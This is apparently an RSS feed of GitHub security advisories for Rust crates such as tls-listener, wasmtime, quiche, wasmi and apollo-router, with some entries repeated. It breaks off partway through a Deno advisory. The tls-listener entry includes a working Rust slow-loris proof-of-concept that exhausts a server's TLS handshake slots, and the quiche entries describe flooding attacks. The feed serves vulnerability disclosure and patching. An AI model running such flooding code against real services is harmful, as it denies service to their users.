<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2024-03-29T11:02:12.771Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[tls-listener] tls-listener affected by the slow loris vulnerability with default configuration]]></title>
        <id>https://github.com/advisories/GHSA-2qph-qpvm-2qf7</id>
        <link href="https://github.com/advisories/GHSA-2qph-qpvm-2qf7"/>
        <updated>2024-03-18T18:33:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>With the default configuration of tls-listener, a malicious user can open 6.4 <code>TcpStream</code>s a second, sending 0 bytes, and can trigger a DoS.</p>
<h3 id="details">Details</h3>
<p>The default configuration options make any public service using <code>TlsListener::new()</code> vulnerable to a slow-loris DoS attack.</p>
<pre><code class="language-rust">/// Default number of concurrent handshakes
pub const DEFAULT_MAX_HANDSHAKES: usize = 64;
/// Default timeout for the TLS handshake.
pub const DEFAULT_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(10);
</code></pre>
<h3 id="poc">PoC</h3>
<p>Running the HTTP TLS server example: <a href="https://github.com/tmccombs/tls-listener/blob/6c57dea2d9beb1577ae4d80f6eaf03aad4ef3857/examples/http.rs">https://github.com/tmccombs/tls-listener/blob/6c57dea2d9beb1577ae4d80f6eaf03aad4ef3857/examples/http.rs</a>, then running the following script will prevent new connections to the server.</p>
<pre><code class="language-rust">use std::{net::ToSocketAddrs, time::Duration};
use tokio::{io::AsyncReadExt, net::TcpStream, task::JoinSet};

#[tokio::main]
async fn main() {
    const N: usize = 1024;
    const T: Duration = Duration::from_secs(10);

    let url = "127.0.0.1:3000";
    let sockets: Vec&lt;_&gt; = url
        .to_socket_addrs()
        .unwrap()
        .inspect(|s| println!("{s:?}"))
        .collect();

    let mut js = JoinSet::new();

    let mut int = tokio::time::interval(T / (N as u32) / (sockets.len() as u32));
    int.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Burst);
    for _ in 0..10000 {
        for &amp;socket in &amp;sockets {
            int.tick().await;
            js.spawn(async move {
                let mut stream = TcpStream::connect(socket).await.unwrap();
                let _ = tokio::time::timeout(T, stream.read_to_end(&amp;mut Vec::new())).await;
            });
        }
    }

    while js.join_next().await.is_some() {}
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an instance of a <a href="https://en.wikipedia.org/wiki/Slowloris_(computer_security)">slow-loris attack</a>. This impacts any publically accessible service using the default configuration of <code>tls-listener</code></p>
<h3 id="mitigation">Mitigation</h3>
<p>Previous versions can mitigate this by passing a large value, such as <code>usize::MAX</code> as the parameter to <code>Builder::max_handshakes</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tmccombs/tls-listener/security/advisories/GHSA-2qph-qpvm-2qf7">https://github.com/tmccombs/tls-listener/security/advisories/GHSA-2qph-qpvm-2qf7</a></li>
<li><a href="https://github.com/tmccombs/tls-listener/commit/d5a7655d6ea9e53ab57c3013092c5576da964bc4">https://github.com/tmccombs/tls-listener/commit/d5a7655d6ea9e53ab57c3013092c5576da964bc4</a></li>
<li><a href="https://github.com/tmccombs/tls-listener/releases/tag/v0.10.0">https://github.com/tmccombs/tls-listener/releases/tag/v0.10.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28854">https://nvd.nist.gov/vuln/detail/CVE-2024-28854</a></li>
<li><a href="https://en.wikipedia.org/wiki/Slowloris_(computer_security)">https://en.wikipedia.org/wiki/Slowloris_(computer_security)</a></li>
<li><a href="https://github.com/advisories/GHSA-2qph-qpvm-2qf7">https://github.com/advisories/GHSA-2qph-qpvm-2qf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qph-qpvm-2qf7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-15T19:57:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cranelift-codegen] Miscompilation of `i8x16.swizzle` and `select` with v128 inputs]]></title>
        <id>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</id>
        <link href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x"/>
        <updated>2024-03-14T21:40:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Wasmtime's implementation of the <a href="https://github.com/webassembly/simd">SIMD proposal for WebAssembly</a> on x86_64 contained two distinct bugs in the instruction lowerings implemented in Cranelift. The aarch64 implementation of the simd proposal is not affected. The bugs were presented in the <code>i8x16.swizzle</code> and <code>select</code> WebAssembly instructions. The <code>select</code> instruction is only affected when the inputs are of <code>v128</code> type. The correspondingly affected Cranelift instructions were <code>swizzle</code> and <code>select</code>.</p>
<p>The <code>swizzle</code> instruction lowering in Cranelift erroneously overwrote the mask input register which could corrupt a constant value, for example. This means that future uses of the same constant may see a different value than the constant itself.</p>
<p>The <code>select</code> instruction lowering in Cranelift wasn't correctly implemented for vector types that are 128-bits wide. When the condition was 0 the wrong instruction was used to move the correct input to the output of the instruction meaning that only the low 32 bits were moved and the upper 96 bits of the result were left as whatever the register previously contained (instead of the input being moved from). The <code>select</code> instruction worked correctly if the condition was nonzero, however.</p>
<p>This bug in Wasmtime's implementation of these instructions on x86_64 represents an incorrect implementation of the specified semantics of these instructions according to the <a href="https://webassembly.github.io/spec/">WebAssembly specification</a>. The impact of this is benign for hosts running WebAssembly but represents possible vulnerabilities within the execution of a guest program. For example a WebAssembly program could take unintended branches or materialize incorrect values internally which runs the risk of exposing the program itself to other related vulnerabilities which can occur from miscompilations.</p>
<h3 id="patches">Patches</h3>
<p>We have released Wasmtime 0.38.1 and cranelift-codegen (and other associated cranelift crates) 0.85.1 which contain the corrected implementations of these two instructions in Cranelift.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not an option for you at this time, you can avoid the vulnerability by <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">disabling the Wasm simd proposal</a></p>
<pre><code class="language-rust">config.wasm_simd(false);
</code></pre>
<p>Additionally the bug is only present on x86_64 hosts. Other aarch64 hosts are not affected. Note that s390x hosts don't yet implement the simd proposal and are not affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webassembly/simd">The WebAssembly simd proposal</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/issues/4315">Original test case showing the erroneous behavior</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">Fix for the <code>swizzle</code> instruction</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">Fix for the <code>select</code> instruction</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31104">https://nvd.nist.gov/vuln/detail/CVE-2022-31104</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">https://github.com/bytecodealliance/wasmtime/pull/4317</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">https://github.com/bytecodealliance/wasmtime/pull/4318</a></li>
<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd</a></li>
<li><a href="https://github.com/webassembly/simd">https://github.com/webassembly/simd</a></li>
<li><a href="https://webassembly.github.io/spec">https://webassembly.github.io/spec</a></li>
<li><a href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/advisories/GHSA-jqwc-c49r-4w2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-06-29T22:08:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wasmtime] Miscompilation of `i8x16.swizzle` and `select` with v128 inputs]]></title>
        <id>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</id>
        <link href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x"/>
        <updated>2024-03-14T21:40:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Wasmtime's implementation of the <a href="https://github.com/webassembly/simd">SIMD proposal for WebAssembly</a> on x86_64 contained two distinct bugs in the instruction lowerings implemented in Cranelift. The aarch64 implementation of the simd proposal is not affected. The bugs were presented in the <code>i8x16.swizzle</code> and <code>select</code> WebAssembly instructions. The <code>select</code> instruction is only affected when the inputs are of <code>v128</code> type. The correspondingly affected Cranelift instructions were <code>swizzle</code> and <code>select</code>.</p>
<p>The <code>swizzle</code> instruction lowering in Cranelift erroneously overwrote the mask input register which could corrupt a constant value, for example. This means that future uses of the same constant may see a different value than the constant itself.</p>
<p>The <code>select</code> instruction lowering in Cranelift wasn't correctly implemented for vector types that are 128-bits wide. When the condition was 0 the wrong instruction was used to move the correct input to the output of the instruction meaning that only the low 32 bits were moved and the upper 96 bits of the result were left as whatever the register previously contained (instead of the input being moved from). The <code>select</code> instruction worked correctly if the condition was nonzero, however.</p>
<p>This bug in Wasmtime's implementation of these instructions on x86_64 represents an incorrect implementation of the specified semantics of these instructions according to the <a href="https://webassembly.github.io/spec/">WebAssembly specification</a>. The impact of this is benign for hosts running WebAssembly but represents possible vulnerabilities within the execution of a guest program. For example a WebAssembly program could take unintended branches or materialize incorrect values internally which runs the risk of exposing the program itself to other related vulnerabilities which can occur from miscompilations.</p>
<h3 id="patches">Patches</h3>
<p>We have released Wasmtime 0.38.1 and cranelift-codegen (and other associated cranelift crates) 0.85.1 which contain the corrected implementations of these two instructions in Cranelift.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not an option for you at this time, you can avoid the vulnerability by <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">disabling the Wasm simd proposal</a></p>
<pre><code class="language-rust">config.wasm_simd(false);
</code></pre>
<p>Additionally the bug is only present on x86_64 hosts. Other aarch64 hosts are not affected. Note that s390x hosts don't yet implement the simd proposal and are not affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webassembly/simd">The WebAssembly simd proposal</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/issues/4315">Original test case showing the erroneous behavior</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">Fix for the <code>swizzle</code> instruction</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">Fix for the <code>select</code> instruction</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-jqwc-c49r-4w2x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31104">https://nvd.nist.gov/vuln/detail/CVE-2022-31104</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4317">https://github.com/bytecodealliance/wasmtime/pull/4317</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/pull/4318">https://github.com/bytecodealliance/wasmtime/pull/4318</a></li>
<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd">https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.wasm_simd</a></li>
<li><a href="https://github.com/webassembly/simd">https://github.com/webassembly/simd</a></li>
<li><a href="https://webassembly.github.io/spec">https://webassembly.github.io/spec</a></li>
<li><a href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x">https://github.com/advisories/GHSA-jqwc-c49r-4w2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-06-29T22:08:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quiche] quiche vulnerable to unlimited resource allocation by QUIC CRYPTO frames flooding]]></title>
        <id>https://github.com/advisories/GHSA-78wx-jg4j-5j6g</id>
        <link href="https://github.com/advisories/GHSA-78wx-jg4j-5j6g"/>
        <updated>2024-03-13T15:39:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cloudflare Quiche (through version 0.19.1/0.20.0) was affected by an unlimited resource allocation vulnerability causing rapid increase of memory usage of the system running quiche server or client.</p>
<p>A remote attacker could take advantage of this vulnerability by repeatedly sending an unlimited number of 1-RTT CRYPTO frames after previously completing the QUIC handshake.
Exploitation was possible for the duration of the connection which could be extended by the attacker.</p>
<h3 id="patches">Patches</h3>
<p>Quiche 0.19.2 and 0.20.1 are the earliest versions containing the fix for this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g">https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1765">https://nvd.nist.gov/vuln/detail/CVE-2024-1765</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2">https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c">https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.19.2">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.20.1">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>
<li><a href="https://github.com/advisories/GHSA-78wx-jg4j-5j6g">https://github.com/advisories/GHSA-78wx-jg4j-5j6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78wx-jg4j-5j6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-13T15:39:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quiche] quiche vulnerable to unlimited resource allocation by QUIC CRYPTO frames flooding]]></title>
        <id>https://github.com/advisories/GHSA-78wx-jg4j-5j6g</id>
        <link href="https://github.com/advisories/GHSA-78wx-jg4j-5j6g"/>
        <updated>2024-03-13T15:39:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cloudflare Quiche (through version 0.19.1/0.20.0) was affected by an unlimited resource allocation vulnerability causing rapid increase of memory usage of the system running quiche server or client.</p>
<p>A remote attacker could take advantage of this vulnerability by repeatedly sending an unlimited number of 1-RTT CRYPTO frames after previously completing the QUIC handshake.
Exploitation was possible for the duration of the connection which could be extended by the attacker.</p>
<h3 id="patches">Patches</h3>
<p>Quiche 0.19.2 and 0.20.1 are the earliest versions containing the fix for this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g">https://github.com/cloudflare/quiche/security/advisories/GHSA-78wx-jg4j-5j6g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1765">https://nvd.nist.gov/vuln/detail/CVE-2024-1765</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2">https://github.com/cloudflare/quiche/commit/1017466c143fc93a82b286a1ba35e53334cdf8e2</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c">https://github.com/cloudflare/quiche/commit/11dbf5461ab657bbc02e466d719070124b27ef3c</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.19.2">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.20.1">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>
<li><a href="https://github.com/advisories/GHSA-78wx-jg4j-5j6g">https://github.com/advisories/GHSA-78wx-jg4j-5j6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78wx-jg4j-5j6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-13T15:39:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quiche] quiche vulnerable to unbounded storage of information related to connection ID retirement]]></title>
        <id>https://github.com/advisories/GHSA-xhg9-xwch-vr7x</id>
        <link href="https://github.com/advisories/GHSA-xhg9-xwch-vr7x"/>
        <updated>2024-03-13T15:38:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cloudflare quiche was discovered to be vulnerable to unbounded storage of information related to connection ID retirement, which could lead to excessive resource consumption. Each QUIC connection possesses a set of connection Identifiers (IDs); see <a href="https://datatracker.ietf.org/doc/html/rfc9000#section-5.1">RFC 9000 Section 5.1</a>. Endpoints declare the number of active connection IDs they are willing to support using the active_connection_id_limit transport parameter. The peer can create new IDs using a NEW_CONNECTION_ID frame but must stay within the active ID limit. This is done by retirement of old IDs, the endpoint sends NEW_CONNECTION_ID includes a value in the retire_prior_to field, which elicits a RETIRE_CONNECTION_ID frame as confirmation. An unauthenticated remote attacker can exploit the vulnerability by sending NEW_CONNECTION_ID frames and manipulating the connection (e.g. by restricting the peer's congestion window size) so that RETIRE_CONNECTION_ID frames can only be sent at a slower rate than they are received, leading to storage of information related to connection IDs in an unbounded queue. </p>
<h3 id="patches">Patches</h3>
<p>Quiche versions 0.19.2 and 0.20.1 are the earliest to address this problem. There is no workaround for affected versions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x">https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1410">https://nvd.nist.gov/vuln/detail/CVE-2024-1410</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af">https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1">https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40">https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67">https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.19.2">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.20.1">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>
<li><a href="https://github.com/advisories/GHSA-xhg9-xwch-vr7x">https://github.com/advisories/GHSA-xhg9-xwch-vr7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xhg9-xwch-vr7x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-13T15:38:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quiche] quiche vulnerable to unbounded storage of information related to connection ID retirement]]></title>
        <id>https://github.com/advisories/GHSA-xhg9-xwch-vr7x</id>
        <link href="https://github.com/advisories/GHSA-xhg9-xwch-vr7x"/>
        <updated>2024-03-13T15:38:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cloudflare quiche was discovered to be vulnerable to unbounded storage of information related to connection ID retirement, which could lead to excessive resource consumption. Each QUIC connection possesses a set of connection Identifiers (IDs); see <a href="https://datatracker.ietf.org/doc/html/rfc9000#section-5.1">RFC 9000 Section 5.1</a>. Endpoints declare the number of active connection IDs they are willing to support using the active_connection_id_limit transport parameter. The peer can create new IDs using a NEW_CONNECTION_ID frame but must stay within the active ID limit. This is done by retirement of old IDs, the endpoint sends NEW_CONNECTION_ID includes a value in the retire_prior_to field, which elicits a RETIRE_CONNECTION_ID frame as confirmation. An unauthenticated remote attacker can exploit the vulnerability by sending NEW_CONNECTION_ID frames and manipulating the connection (e.g. by restricting the peer's congestion window size) so that RETIRE_CONNECTION_ID frames can only be sent at a slower rate than they are received, leading to storage of information related to connection IDs in an unbounded queue. </p>
<h3 id="patches">Patches</h3>
<p>Quiche versions 0.19.2 and 0.20.1 are the earliest to address this problem. There is no workaround for affected versions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x">https://github.com/cloudflare/quiche/security/advisories/GHSA-xhg9-xwch-vr7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1410">https://nvd.nist.gov/vuln/detail/CVE-2024-1410</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af">https://github.com/cloudflare/quiche/commit/0c5733a84c41e9e178adc866b11ce59ac264f5af</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1">https://github.com/cloudflare/quiche/commit/5be8143126f8cfa8a483d4a5ae475b9a46053fa1</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40">https://github.com/cloudflare/quiche/commit/7ab42af5f5e97f20f1d63b7ea2f9ab0536678c40</a></li>
<li><a href="https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67">https://github.com/cloudflare/quiche/commit/a983998c4408605905ee9a6ab0fc00e68436ac67</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.19.2">https://github.com/cloudflare/quiche/releases/tag/0.19.2</a></li>
<li><a href="https://github.com/cloudflare/quiche/releases/tag/0.20.1">https://github.com/cloudflare/quiche/releases/tag/0.20.1</a></li>
<li><a href="https://github.com/advisories/GHSA-xhg9-xwch-vr7x">https://github.com/advisories/GHSA-xhg9-xwch-vr7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xhg9-xwch-vr7x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-13T15:38:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wasmi] Wasmi Out-of-bounds Write for host to Wasm calls with more than 128 Parameters]]></title>
        <id>https://github.com/advisories/GHSA-75jp-vq8x-h4cq</id>
        <link href="https://github.com/advisories/GHSA-75jp-vq8x-h4cq"/>
        <updated>2024-03-07T17:26:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the WASMI Interpreter, an <a href="https://cwe.mitre.org/data/definitions/787.html">Out-of-bounds Buffer Write</a> will arise arise if the host calls or resumes a Wasm function with more parameters than the default limit (128), as it will surpass the stack value. This doesn’t affect calls from Wasm to Wasm, only from host to Wasm.</p>
<h3 id="impact">Impact</h3>
<p>After conducting an analysis of the dependent Polkadot systems of <code>wasmi</code>: <a href="https://github.com/paritytech/polkadot-sdk/tree/master/substrate/frame/contracts">Pallet Contracts</a>, <a href="https://github.com/paritytech/parity-signer">Parity Signer</a>, and <a href="https://github.com/smol-dot/smoldot">Smoldot</a>, we have found that none on those systems have been affected by the issue as they are calling host to Wasm function with a small limited amount of parameters always. </p>
<h3 id="mitigations">Mitigations</h3>
<p>If you are using <code>wasmi</code> betwen version 0.15.0 and 0.31.0, please update it to the <a href="https://github.com/paritytech/wasmi/releases/tag/v0.31.1">0.31.1</a> patch release that we just published.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure no more than 128 parameters can be pass in a call from the host to a Wasm function. </p>
<h3 id="references">References</h3>
<p>Patch PR: </p>
<h3 id="special-thanks">Special thanks</h3>
<p>Special thanks to Stellar Development Foundation for reporting this security vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/wasmi-labs/wasmi/security/advisories/GHSA-75jp-vq8x-h4cq">https://github.com/wasmi-labs/wasmi/security/advisories/GHSA-75jp-vq8x-h4cq</a></li>
<li><a href="https://github.com/wasmi-labs/wasmi/commit/f7b3200e9f3dc9e2cbca966cb255c228453c792f">https://github.com/wasmi-labs/wasmi/commit/f7b3200e9f3dc9e2cbca966cb255c228453c792f</a></li>
<li><a href="https://github.com/wasmi-labs/wasmi/releases/tag/v0.31.1">https://github.com/wasmi-labs/wasmi/releases/tag/v0.31.1</a></li>
<li><a href="https://github.com/advisories/GHSA-75jp-vq8x-h4cq">https://github.com/advisories/GHSA-75jp-vq8x-h4cq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75jp-vq8x-h4cq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-07T17:26:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-router] Apollo Router's Compressed Payloads do not respect HTTP Payload Limits]]></title>
        <id>https://github.com/advisories/GHSA-cgqf-3cq5-wvcj</id>
        <link href="https://github.com/advisories/GHSA-cgqf-3cq5-wvcj"/>
        <updated>2024-03-06T18:24:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Apollo Router is a configurable, high-performance graph router written in Rust to run a federated supergraph that uses Apollo Federation. Affected versions are subject to a Denial-of-Service (DoS) type vulnerability. When receiving compressed HTTP payloads, affected versions of the Router evaluate the <code>limits.http_max_request_bytes</code> configuration option after the entirety of the compressed payload is decompressed. If affected versions of the Router receive highly compressed payloads, this could result in significant memory consumption while the compressed payload is expanded. </p>
<h3 id="patches">Patches</h3>
<p>Router version 1.40.2 has a fix for the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to upgrade, you may be able to implement mitigations at proxies or load balancers positioned in front of your Router fleet (e.g. Nginx, HAProxy, or cloud-native WAF services) by creating limits on HTTP body upload size. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-cgqf-3cq5-wvcj">https://github.com/apollographql/router/security/advisories/GHSA-cgqf-3cq5-wvcj</a></li>
<li><a href="https://github.com/apollographql/router/commit/9e9527c73c8f34fc8438b09066163cd42520f413">https://github.com/apollographql/router/commit/9e9527c73c8f34fc8438b09066163cd42520f413</a></li>
<li><a href="https://github.com/advisories/GHSA-cgqf-3cq5-wvcj">https://github.com/advisories/GHSA-cgqf-3cq5-wvcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgqf-3cq5-wvcj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T18:24:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Deno] *const c_void / ExternalPointer unsoundness leading to use-after-free]]></title>
        <id>https://github.com/advisories/GHSA-3j27-563v-28wf</id>
        <link href="https://github.com/advisories/GHSA-3j27-563v-28wf"/>
        <updated>2024-03-06T17:04:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Use of inherently unsafe <code>*const c_void</code> and <code>ExternalPointer</code> leads to use-after-free access of the underlying structure, resulting in arbitrary code execution.</p>
<h3 id="details">Details</h3>
<p><code>*const c_void</code> and <code>ExternalPointer</code> (defined via <code>external!()</code> macros) types are used to represent <code>v8::External</code> wrapping arbitrary <code>void*</code> with an external lifetime. This is inherently unsafe as we are effectively eliding all Rust lifetime safety guarantees.</p>
